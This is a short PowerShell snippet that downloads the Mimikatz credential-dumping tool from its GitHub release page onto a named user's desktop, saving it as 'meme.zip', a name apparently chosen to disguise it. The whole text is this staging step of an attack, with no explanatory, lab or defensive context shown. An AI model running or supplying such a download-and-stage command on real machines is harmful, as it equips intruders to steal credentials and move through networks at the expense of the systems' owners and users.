[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180502/mimikatz_trunk.zip","C:\Users\fpasswd1\Desktop\meme.zip")
